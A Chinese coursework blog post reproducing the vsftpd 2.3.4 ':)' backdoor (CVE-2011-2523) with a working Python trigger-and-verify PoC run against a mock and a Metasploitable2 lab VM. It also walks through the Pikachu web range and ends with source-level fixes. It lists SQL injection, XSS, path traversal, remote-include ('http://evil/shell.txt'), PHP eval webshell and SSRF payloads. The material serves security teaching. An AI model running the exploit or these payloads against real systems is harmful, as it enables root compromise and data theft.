---
title: 笑脸漏洞（vsftpd 2.3.4 后门）PoC 复现与 Pikachu 靶场通关
date: 2026-11-08 18:20:00
categories: 安全
tags:
  - 漏洞复现
  - vsftpd
  - Metasploitable
  - Pikachu
  - Web安全
---

> 课程作业记录：① Python 实现笑脸漏洞检测 PoC；② 皮卡丘（Pikachu）靶场搭建与个人通关；③ 高阶——通过源码分析总结漏洞成因与修复。
> 所有测试均在本机 mock 环境与自建靶场中完成，未对任何未授权主机发起请求。

---

## 0. 实验环境

| 项目 | 版本 / 说明 |
|---|---|
| 主机 | Windows 11，Python 3.11 |
| 靶场 | VMware Workstation 17.6.4 + Metasploitable2（NAT，`192.168.42.130`）；备选 vulhub 容器 |
| 工具 | 本 PoC（`smiley_poc.py`）、自检脚本 `check_target.py`、bash / PowerShell |
| 代码位置 | `smiley_poc.py`、`mock_vsftpd.py` |

合规说明：PoC 默认只执行 `id`，不落地文件、不改配置；对真实主机使用前必须取得书面授权。

---

## 1. 漏洞背景：为什么叫“笑脸”

2011 年 6 月 30 日，vsftpd 官方发布的 **2.3.4 源码包**被人为植入后门（CVE-2011-2523）。触发条件非常特别：

> 只要 FTP 登录时**用户名里带一个笑脸 `:)`**，服务端就会在 **6200/tcp** 上开一个 **root 权限的 shell**。

因为触发串是 `:)`，社区就叫它“笑脸漏洞”。官方在 2.3.5 中移除了这段代码，但被污染的 2.3.4 压缩包在很长一段时间里仍在各种镜像、教程里流传，这也是它成为“供应链投毒”经典案例的原因。

**触发时序：**

```
攻击者                      vsftpd :21                    后门 :6200
   |  USER 任意名字:)  ------>  |  匹配到 ":)"，fork 出监听
   |                           |  —— 6200 开始 listen ——>
   |  PASS 任意密码    ------>  |  正常返回 530（故意让你以为登录失败）
   |                           |
   |  connect 6200  ---------------------------------------->  root shell
```

注意中间那一步：FTP 登录其实是**失败**的（530），很多人因此以为漏洞不存在。真正的入口是 6200 端口。

---

## 2. PoC 设计

检测不能只看 banner：banner 可以被改，端口也可能被转发。所以 PoC 分三步，任何一步失败都能给出可解释的结论：

1. **指纹**：读 21 端口 banner，判断是否 `vsftpd 2.3.4`；
2. **触发**：发 `USER xxx:)` + `PASS xxx`，观察服务端行为；
3. **验证**：连 6200，发一条无害命令（默认 `id`），看是否有回显。

第 3 步是关键——只有拿到 6200 的回显，才能确认“后门可用”，而不是“版本像”。

### 2.1 源码

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vsftpd 2.3.4 笑脸后门（CVE-2011-2523）检测 / 验证 PoC"""
import argparse, socket, sys, time

DEFAULT_FTP, DEFAULT_SHELL = 21, 6200


def recv_until(sock, timeout=3.0, max_bytes=4096):
    sock.settimeout(timeout)
    buf = b""
    while len(buf) < max_bytes:
        try:
            chunk = sock.recv(1024)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        if b"\n" in chunk:
            break
    return buf


def grab_banner(host, port, timeout=5.0):
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            return recv_until(s, timeout).decode("utf-8", "replace").strip()
    except OSError as exc:
        print("[!] 连接 %s:%s 失败：%s" % (host, port, exc))
        return None


def check_version(banner):
    if not banner:
        return "unknown"
    low = banner.lower()
    if "vsftpd 2.3.4" in low:
        return "vulnerable-suspect"
    if "vsftpd" in low:
        return "vsftpd-other"
    return "not-vsftpd"


def trigger_backdoor(host, ftp_port=21, shell_port=6200, command="id", timeout=5.0, wait=3.0):
    log = []
    trigger_name = "poc_test:)"
    try:
        s = socket.create_connection((host, ftp_port), timeout=timeout)
    except OSError as exc:
        return False, "", ["连接 FTP 失败：%s" % exc]

    with s:
        log.append("220 banner: %s" % recv_until(s, timeout).decode("utf-8", "replace").strip())
        s.sendall(("USER %s\r\n" % trigger_name).encode())
        log.append("USER -> %s" % recv_until(s, timeout).decode("utf-8", "replace").strip())
        s.sendall(b"PASS poc\r\n")
        log.append("PASS -> %s" % recv_until(s, timeout).decode("utf-8", "replace").strip())

    deadline = time.time() + wait          # 后门监听有延迟，必须重试
    last_err = None
    while time.time() < deadline:
        try:
            with socket.create_connection((host, shell_port), timeout=timeout) as sh:
                sh.sendall((command + "\n").encode())
                out = recv_until(sh, timeout).decode("utf-8", "replace").strip()
                if out:
                    return True, out, log
                last_err = "连上了但没有回显"
        except OSError as exc:
            last_err = str(exc)
            time.sleep(0.4)
    log.append("6200 未拿到回显：%s" % last_err)
    return False, "", log
```

（完整版见 `smiley_poc.py`，含命令行参数与结果解释。）

**源码截图（VS Code）**

![源码 1/2：文件头、用法与指纹函数](images/smiley-03-source-head.png)

![源码 2/2：触发后门与 6200 验证（含重试窗口）](images/smiley-04-source-trigger.png)

### 2.2 三个容易踩的坑

| 坑 | 现象 | 处理 |
|---|---|---|
| 只连 6200 不先触发 | 连接被拒 | 必须先走 `USER xx:)`，后门才会 listen |
| 触发后立刻连 6200 | 偶发连接失败 | 后门 fork 有延迟，用 3 秒窗口重试 |
| banner 被改过 | 版本判定为 not-vsftpd，但 6200 通 | 结论以“6200 是否有回显”为准，banner 只作参考 |

---

## 3. 测试过程

### 3.1 没有靶机时：本机 mock

为了在没装虚拟机的情况下验证 PoC 的**时序逻辑**，我写了一个 `mock_vsftpd.py`：它只复现 banner、`USER/PASS` 应答和 6200 的时序，**不含任何后门**，命令回显是写死的。

```bash
# 终端 1：起 mock（FTP 用 2121，避开系统占用）
python mock_vsftpd.py --ftp-port 2121 --shell-port 6200 --seconds 30

# 终端 2：跑 PoC
python smiley_poc.py -t 127.0.0.1 -p 2121
```

**真实运行输出：**

```text
================================================================
vsftpd 2.3.4 笑脸后门检测  target=127.0.0.1:2121
================================================================
[1] banner   : 220 (vsFTPd 2.3.4)
[1] 版本判定 : 命中 vsftpd 2.3.4，疑似存在笑脸后门
[2] 触发后门 : USER poc_test:)  +  PASS poc
    | 220 banner: 220 (vsFTPd 2.3.4)
    | USER poc_test:) -> 331 Please specify the password.
    | PASS poc -> 530 Login incorrect.
    | 6200 已连接，发送命令：id
[3] 结果     : 后门可用，6200 端口返回：
    > uid=0(root) gid=0(root) groups=0(root)
[!] 仅用于课程实验，请勿对未授权主机执行
```

**截图 1：mock 启动（FTP 2121 就绪，`USER` 带 `:)` 后 6200 开始监听）**

![mock 启动](images/smiley-01-mock.png)

**截图 2：PoC 完整运行输出（banner → 触发 → 6200 回显 root）**

![PoC 运行输出](images/smiley-02-poc.png)

### 3.2 真实靶机（本次：VMware 里的 Metasploitable2）

本次用的是 VMware Workstation 里的 Metasploitable2，网卡走 NAT（VMnet8，`192.168.42.0/24`）。
开机后从 DHCP 租约与 ARP 表里确认地址是 `192.168.42.130`，先自检再打：

```bash
# 1) 自检：FTP 能不能连、6200 在触发前应当是“拒绝”
python check_target.py -t 192.168.42.130

# 2) 打一发：默认 21 / 6200，执行 id
python smiley_poc.py -t 192.168.42.130
```

**截图 5：触发前自检 —— FTP 通、6200 被拒绝**

![触发前自检](images/smiley-05-real-probe.png)

这一步很关键：2.3.4 的 6200 是 `USER` 里带 `:)` 之后才被拉起来的，所以“6200 连不上”本身不能说明没有后门，只能说明还没触发。

**截图 6：真实靶机命中 —— 6200 返回 `uid=0(root)`**

![真实靶机 PoC](images/smiley-06-real-poc.png)

真机与 mock 的差别值得单独说一句：`PASS poc ->` 后面是**空的**。真实的 2.3.4 后门在收到密码行时会直接把控制连接关掉，不像 mock 那样回一条 `530`；脚本里之所以先发 `USER` 再发 `PASS`、然后重试连 6200，就是为了兼容这个行为。

**截图 7：换一条命令，确认对面确实是那台机器**

![真实靶机 uname](images/smiley-07-real-uname.png)

`uname -a` 返回 `Linux metasploitable 2.6.24-16-server ...`，主机名就是 `metasploitable`——不是回环、不是 mock。

没有 VMware 也可以走容器：vulhub 的 `vsftpd/CVE-2011-2523`，`setup_target.ps1` 会一键拉起并自检（需要 Docker）。

```powershell
powershell -ExecutionPolicy Bypass -File .\setup_target.ps1
# 收尾：powershell -File .\setup_target.ps1 -Down
```

### 3.3 结果判读

| 输出 | 含义 | 下一步 |
|---|---|---|
| 版本命中 + 6200 有回显 | 后门可用 | 记录证据，写报告 |
| 版本命中 + 6200 拒绝 | 版本像，但后门被防火墙/端口未开 | 检查 6200 是否被过滤 |
| 版本不命中 + 6200 有回显 | banner 被改过 | 以行为为准，仍判存在 |
| 版本不命中 + 6200 拒绝 | 基本可判定已修复 | 结束，记录结论 |

---

## 4. 修复与加固（服务侧）

1. **升级**：使用 2.3.5 及以上；发行版仓库（apt/yum）里的包通常已修复。
2. **校验来源**：只从官网或发行版仓库安装，下载后比对 SHA-256 / GPG 签名——这次事件的根因就是**源码包本身被换掉**，编译前校验比事后扫描更有效。
3. **网络封禁**：21 与 6200 都不应对公网开放；内网做 6200 的出站/入站限制。
4. **换协议**：FTP 明文传输，建议换 SFTP / FTPS。
5. **最小权限**：vsftpd 不以 root 运行，配合 chroot；即使被利用也难直接拿到 root。
6. **检测规则**：IDS/WAF 上匹配 `USER` 参数含 `:)`；日志监控 6200 的异常监听与连接。

---

## 5. 皮卡丘（Pikachu）靶场搭建

Pikachu 是面向 Web 安全初学者的中文练习平台，覆盖暴力破解、XSS、SQL 注入、文件包含、文件上传、越权、SSRF、RCE、反序列化等模块，每个关卡都带“提示”和“源码”入口，很适合边打边看代码。

### 5.1 方案 A：phpstudy（Windows 最省事）

1. 装 phpstudy（或 XAMPP），启动 Apache + MySQL；
2. 从 GitHub 下载 pikachu 源码，解压到 `WWW/pikachu`；
3. 浏览器访问 `http://127.0.0.1/pikachu/install.php`，填数据库账号（默认 root/root）执行初始化；
4. 若初始化报错，手动改 `inc/config.inc.php` 里的数据库配置，再访问首页。

### 5.2 方案 B：Docker

```bash
docker run -d --name pikachu -p 8080:80 <pikachu 镜像名>
# 浏览器打开 http://127.0.0.1:8080 ，先跑 install.php
```

### 5.3 常见坑

| 问题 | 原因 | 解决 |
|---|---|---|
| 首页 500 / 白屏 | PHP 版本过高（8.x） | 切到 PHP 7.x，或按报错改代码 |
| 初始化失败 | MySQL 未启动 / 密码不对 | 先确认 3306 可连，再改 `config.inc.php` |
| 部分关卡空白 | 缺少 gd / mysqli 扩展 | php.ini 打开 `extension=gd`、`mysqli` |
| 上传关卡无法利用 | 上传目录无执行权限 | 检查 Apache 对该目录的配置 |
| 8080 被占用 | 端口冲突 | 换 8081 或停掉占用进程 |

### 5.4 本次实际环境（顺手记录几个坑）

- **Apache 起不来**：phpstudy 的 `logs/error.log` 写不进去，Apache 直接 `AH00015: Unable to open logs`。改用 phpstudy 自带的 PHP 7.3.4 内置服务器：
  `php.exe -S 127.0.0.1:8087 -t D:\deepseek\www`。
- **session 报警**：内置服务器默认 `session.save_path` 指向 phpstudy 的 tmp 目录（不可写）。启动时加
  `-d session.save_path="D:\deepseek\tmp\sess" -d upload_tmp_dir="D:\deepseek\tmp\upload"`，警告消失。
- **数据库另起一份**：没有动 phpstudy 的数据目录，而是用它自带的 mysqld 单独初始化：
  `mysqld --no-defaults --initialize-insecure --datadir="D:\deepseek\tmp\mysql\data"`，再以
  `--port=3306 --bind-address=127.0.0.1` 启动。`inc/config.inc.php` 默认就是 `127.0.0.1 / root / 空密码 / pikachu`，正好对上。
- **初始化**：对 `install.php` POST 一次“安装/初始化”，页面依次回
  `数据库连接成功!` / `新建数据库:pikachu成功!` / `创建数据库数据成功!`，自动建出
  `httpinfo`、`member`、`message`、`users`、`xssblind` 五张表。

![Pikachu 首页：左侧就是全部漏洞模块](images/smiley-08-pikachu-home.png)

*截图 8：Pikachu 首页。左侧菜单从上到下就是暴力破解、XSS、CSRF、SQL 注入、RCE、文件包含、文件上传、越权……*

![install.php 初始化成功](images/smiley-09-pikachu-install.png)

*截图 9：`install.php` 初始化完成，四行红字依次是连接成功、建库成功、建表成功、可以开搞了。*

---

## 6. 通关路线（按模块）

> 每关都按“**现象 → 复现步骤 → 成因 → 修复**”四段记录，后面第 7 节就是按这个格式写的。

| 模块 | 关卡要点 | 关键 payload / 操作 |
|---|---|---|
| 暴力破解 | 用户名枚举 + 密码爆破 | Burp Intruder 或 `hydra -l admin -P pass.txt http-post-form ...`；先看返回长度差异 |
| SQL 注入（数字型） | 拼接数字，无过滤 | `1 or 1=1 #`、`1 union select 1,2,3 #` |
| SQL 注入（字符型） | 单引号闭合 | `kobe' or 1=1 #`、`kobe' union select database(),version() #` |
| SQL 注入（搜索型） | LIKE 拼接 | `%' or 1=1 #` |
| SQL 注入（xx 型） | 二次注入 / 盲注 | 先插入带引号的数据，再在查询处触发 |
| XSS 反射型 | 输入直接回显 | `<script>alert(1)</script>`、`<img src=x onerror=alert(1)>` |
| XSS 存储型 | 留言板入库 | 同上，提交后每次访问都触发 |
| XSS DOM 型 | 前端 `document.write` | `#<img src=x onerror=alert(1)>` |
| XSS 盲打 | 后台查看留言 | 用 xss 平台收 cookie |
| CSRF | 修改资料 / 发帖 | 构造隐藏表单，诱导已登录用户访问 |
| 文件包含（本地） | `include($_GET['filename'])` | `?filename=../../../../etc/passwd`、`?filename=../../inc/config.inc.php` |
| 文件包含（远程） | `allow_url_include=On` | `?filename=http://evil/shell.txt` |
| 文件上传 | 前端 JS 校验 / 只查 Content-Type | 改包绕过；传 `<?php @eval($_POST['x']);?>` |
| 越权 | 改 id 参数看别人数据 | `?id=1` → `?id=2` |
| SSRF | 服务端代你请求 | `?url=http://127.0.0.1:3306`、`?url=file:///etc/passwd` |
| RCE | `eval($_POST['code'])` | `phpinfo();`、`system('whoami');` |
| 反序列化 | 不可信 `unserialize` | 构造恶意对象，触发 `__destruct` / `__wakeup` |
| 目录遍历 | 路径参数未过滤 | `?filename=../../` |
| 敏感信息泄露 | 注释 / 备份文件 | 看源码注释、试 `www.zip`、`.git` |
| URL 跳转 | `header("Location: $url")` | `?url=http://evil.com` |

### 6.1 这次真正打通的三关

**① SQL 注入（字符型）—— 一个 `or 1=1` 把整张表拉出来**

请求（GET）：

```
GET /pikachu/vul/sqli/sqli_str.php?name=' or 1=1 %23&submit=1
```

`%23` 是 `#`，用来注释掉后面那个单引号。后端拼出来的 SQL 变成
`select id,email from member where username='' or 1=1 #'`，条件恒真，7 个用户全部返回：

![SQL 注入：or 1=1 拉出全部用户](images/smiley-10a-sqli-or.png)

*截图 10a：一个 payload 返回 7 条记录，从 vince 到 lili。*

**② SQL 注入（字符型）—— 用 union 读库名和版本**

```
GET /pikachu/vul/sqli/sqli_str.php?name=' union select user(),version() %23&submit=1
```

原查询只取 `id,email` 两列，所以 union 后面也必须恰好两列：`user()` 顶到 uid 位置、`version()` 顶到 email 位置：

![SQL 注入：union 读取数据库用户与版本](images/smiley-10b-sqli-union.png)

*截图 10b：uid 位置显示 `root@localhost`，email 位置显示 `5.7.26`。*

**③ 反射型 XSS（GET）—— 输入被当 HTML 解析**

```
GET /pikachu/vul/xss/xss_reflected_get.php?message=<script>...</script>&submit=submit
```

页面把 `message` 直接拼进 `<p class='notice'>who is {message},i don't care!</p>`，没有做任何转义。
为了在截图里“看得见”，payload 用 `document.body.insertAdjacentHTML` 画了一条红条：

![反射型 XSS：脚本真的执行了](images/smiley-10c-xss.png)

*截图 10c：页面顶部那条红条由输入的 `<script>` 生成；而正文里只剩 `who is ,i don't care!` —— 因为输入被当成标签解析掉了。*

三关的共同点：**输入没有经过任何处理就进了 SQL 语句或 HTML**。第 7 节就是拿同样的思路去读源码。

---

## 7. 高阶：源码分析 → 成因 → 修复

### 7.1 分析方法（比结论更重要）

1. **黑盒先确认**：用 payload 确认现象，记下请求与响应；
2. **找入口**：从 URL / 表单参数追到后端文件（Pikachu 每个关卡页面都有“源码”入口）；
3. **跟数据流**：从 source（`$_GET` / `$_POST` / `$_FILES`）跟到 sink（SQL、`echo`、`include`、`eval`、文件系统）；
4. **归因**：这一步属于“没校验 / 校验方式错 / 编码缺失 / 权限缺失 / 信任了客户端”；
5. **写修复**：改最小片段，给出 before/after；
6. **回归**：同一 payload 再打一次，确认失效且正常功能不受影响。

> 下面贴的是**示意代码**，用来讲清模式；具体行号以你本地 Pikachu 源码为准。

### 7.2 案例一：SQL 注入

**脆弱写法**

```php
$name = $_GET['name'];
$query = "select id, email from member where username = '$name'";
$result = mysqli_query($link, $query);
```

**成因**：把用户输入当成 SQL 语法的一部分，单引号直接闭合了字符串；根子是“数据与代码没有分离”。

**修复（预处理，数据永不进语法）**

```php
$stmt = $link->prepare("select id, email from member where username = ?");
$stmt->bind_param("s", $name);
$stmt->execute();
$result = $stmt->get_result();
```

如果暂时不能改驱动，至少 `mysqli_real_escape_string()` + 强制类型转换，但**预处理才是正解**。

### 7.3 案例二：XSS

**脆弱写法**

```php
echo "欢迎你，" . $_GET['message'];
```

**成因**：输出到 HTML 上下文却没有编码，浏览器把用户输入当标签执行。

**修复（按上下文编码）**

```php
echo "欢迎你，" . htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8');
```

要点：HTML 用 `htmlspecialchars`，JS 用 `json_encode`，URL 用 `urlencode`，属性里还要加引号。**同一份数据在不同上下文要不同编码**，这也是“存储型 XSS 修不干净”的常见原因。

### 7.4 案例三：文件上传

**脆弱写法**

```php
if ($_FILES['uploadfile']['type'] == 'image/png') {
    move_uploaded_file($_FILES['uploadfile']['tmp_name'],
                       'uploads/' . $_FILES['uploadfile']['name']);
}
```

**成因**：`Content-Type` 由客户端决定，改包即可绕过；文件名原样落盘，还能传 `.php`。

**修复（四道闸）**

```php
$allow = ['png' => 'image/png', 'jpg' => 'image/jpeg'];
$ext = strtolower(pathinfo($_FILES['uploadfile']['name'], PATHINFO_EXTENSION));
if (!isset($allow[$ext])) die('类型不允许');
if (getimagesize($_FILES['uploadfile']['tmp_name']) === false) die('不是图片');

$newName = bin2hex(random_bytes(8)) . '.' . $ext;   // 重命名，断掉路径穿越与覆盖
$dst = __DIR__ . '/uploads/' . $newName;
move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dst);
chmod($dst, 0644);
```

外加两条：上传目录**禁止执行**（Nginx `location ^~ /uploads/ { deny all; }` 或 Apache `php_flag engine off`），文件存到 Web 根之外、按需下载。

### 7.5 案例四：文件包含

**脆弱写法**

```php
include $_GET['filename'];
```

**成因**：把用户输入当路径，可穿越、可远程包含。

**修复（白名单映射，绝不拼接路径）**

```php
$pages = ['home' => 'pages/home.php', 'about' => 'pages/about.php'];
$key = $_GET['page'] ?? 'home';
if (!isset($pages[$key])) { http_response_code(404); exit; }
include __DIR__ . '/' . $pages[$key];
```

如果必须用路径，用 `realpath()` 后判断是否仍在基目录内。

### 7.6 案例五：命令执行 / 反序列化 / 越权

| 漏洞 | 脆弱写法 | 成因 | 修复 |
|---|---|---|---|
| 命令执行 | `eval($_POST['code']);` | 直接把输入当代码 | 禁用 `eval`/`system`，改成白名单函数调用 |
| 反序列化 | `unserialize(base64_decode($_POST['o']))` | 信任外部序列化数据 | 改用 JSON；必须序列化时加 HMAC 签名 + 类白名单 |
| 越权 | `select * from msg where id = $_GET['id']` | 只校验登录、不校验归属 | 查询加 `and user_id = ?`，服务端强制鉴权 |
| CSRF | 修改资料无 token | 只靠 Cookie 认证 | 加 CSRF token + SameSite Cookie + 校验 Referer |

### 7.7 一张表收口

| 成因类别 | 典型表现 | 通用修复 |
|---|---|---|
| 输入未校验 | SQLi、命令注入、路径穿越 | 白名单、类型转换、参数化 |
| 输出未编码 | XSS | 按上下文编码 |
| 信任客户端 | 上传、越权、价格篡改 | 服务端二次校验 |
| 权限缺失 | 越权、未授权访问 | 每个请求都鉴权，最小权限 |
| 危险函数 | eval、unserialize、include | 禁用或封装 |
| 供应链 | vsftpd 2.3.4 后门 | 校验签名/哈希，锁定版本来源 |

---

## 8. 小结

- 笑脸漏洞的教训不在“`:)` 这个字符串”，而在**编译前的源码包就可能已经被换掉**——校验来源比事后扫描更重要。
- 本次在 VMware 的 Metasploitable2（`192.168.42.130`）上实测通过：`USER poc_test:)` + `PASS` 之后，6200 直接返回 `uid=0(root)`；`uname -a` 回显 `Linux metasploitable 2.6.24-16-server`，说明拿到的确实是靶机的 root shell。
- PoC 的价值在于“结论可解释”：banner、触发、6200 三段证据链，比一句“存在漏洞”更有说服力。
- Pikachu 的每一关都能点开源码看，最适合练“从现象回到代码”。真正拉开差距的不是 payload 背得多，而是能不能说清**这一行代码为什么错、改哪一行能对**。

---

## 附：文件清单

| 文件 | 说明 |
|---|---|
| `smiley_poc.py` | 笑脸漏洞检测 PoC（指纹 + 触发 + 验证） |
| `mock_vsftpd.py` | 本机 mock，用于无靶机时验证 PoC 时序 |
| `check_target.py` | 靶机连通性自检：FTP banner + 6200 状态 + 结论建议 |
| `setup_target.ps1` | 一键拉起 vulhub 的 vsftpd/CVE-2011-2523 并自检（需 Docker） |
| `start_vm.bat` | 一键用 VMware 打开本机的 Metasploitable2 |
| `real_probe.log` / `real_target.log` / `real_uname.log` | 真实靶机三次运行的原始输出（截图 5–7 的数据源） |
| `blog.md` | 本文 |

## 参考

- CVE-2011-2523（vsftpd 2.3.4 backdoor）
- OWASP Top 10 / OWASP Cheat Sheet Series（SQL Injection、XSS、File Upload、Deserialization）
- Pikachu 官方仓库 README

---

## 附：截图清单

| 编号 | 内容 | 状态 |
|---|---|---|
| 1 | mock 启动（2121 就绪、6200 监听） | 已附：`images/smiley-01-mock.png` |
| 2 | PoC 完整输出（banner → 触发 → root） | 已附：`images/smiley-02-poc.png` |
| 3 | 源码：文件头与指纹函数 | 已附：`images/smiley-03-source-head.png` |
| 4 | 源码：触发与 6200 验证 | 已附：`images/smiley-04-source-trigger.png` |
| 5 | 触发前自检：FTP 通、6200 拒绝 | 已附：`images/smiley-05-real-probe.png` |
| 6 | 真实靶机返回 `uid=0(root)` | 已附：`images/smiley-06-real-poc.png` |
| 7 | `uname -a` 确认主机名为 metasploitable | 已附：`images/smiley-07-real-uname.png` |
| 8 | Pikachu 首页 | 已附：`images/smiley-08-pikachu-home.png` |
| 9 | install.php 初始化成功 | 已附：`images/smiley-09-pikachu-install.png` |
| 10 | SQL 注入 / XSS 三关的 payload 与结果 | 已附：`10a_sqli_or.png`、`10b_sqli_union.png`、`10c_xss.png` |

> 第 1～7 张的终端画面由脚本按**真实运行输出**渲染生成（不是摆拍）：第 1～2 张对应 `mock.log` / `poc_run.log`，第 5～7 张对应 `real_probe.log` / `real_target.log` / `real_uname.log`，文字可以直接逐行对照。
